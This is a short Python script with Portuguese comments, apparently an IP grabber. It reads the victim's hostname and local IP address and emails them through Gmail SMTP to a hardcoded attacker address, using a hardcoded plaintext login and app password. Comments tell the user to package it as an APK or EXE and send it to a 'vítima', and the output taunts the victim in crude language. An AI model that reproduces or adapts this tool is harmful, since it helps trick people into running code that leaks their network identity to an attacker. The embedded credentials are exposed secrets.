import socket
import smtplib
import email.message

hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)
a = (IPAddr)
print('''
██████╗░███████╗░██████╗░██╗░░░██╗███████╗██╗  
██╔══██╗██╔════╝██╔════╝░██║░░░██║██╔════╝██║  
██████╔╝█████╗░░██║░░██╗░██║░░░██║█████╗░░██║  
██╔═══╝░██╔══╝░░██║░░╚██╗██║░░░██║██╔══╝░░██║  
██║░░░░░███████╗╚██████╔╝╚██████╔╝███████╗██║  
╚═╝░░░░░╚══════╝░╚═════╝░░╚═════╝░╚══════╝╚═╝  

░██████╗███████╗██╗░░░██╗  
██╔════╝██╔════╝██║░░░██║  
╚█████╗░█████╗░░██║░░░██║  
░╚═══██╗██╔══╝░░██║░░░██║  
██████╔╝███████╗╚██████╔╝  
╚═════╝░╚══════╝░╚═════╝░  

██╗██████╗░
██║██╔══██╗
██║██████╔╝
██║██╔═══╝░
██║██║░░░░░
╚═╝╚═╝░░░░░''')

def enviar_email():
    corpo_email = f'a vitima executou o script, este e o ip ({a}) VAMO APROVEITAR Q O SER HUMANO E FALHO PORRA!'
    
 #COLOCA O TEU EMAIL NO TO E FAZ UM TESTE, LOGO APOS ENVIE O APK/.EXE PRA VITIMA!

    msg = email.message.Message()
    msg['Subject'] = 'O BOBO EXECUTOUKKK'
    msg['From'] = 'ipslayer777@gmail.com'
    msg['To'] = 'slayerlindo6@gmail.com'
    password = 'nimubmvqilvehpoh'
    msg.add_header ('Content-Type', 'text/html')
    msg.set_payload(corpo_email )
#login
    s = smtplib.SMTP('smtp.gmail.com: 587')
    s.starttls()
    # Login Credentials for sending the mail
    s.login(msg['From'], password)
    s.sendmail(msg['From'], [msg['To']], msg.as_string().encode('utf-8'))
    print('VC TOMOU NO CUKKK')

enviar_email()

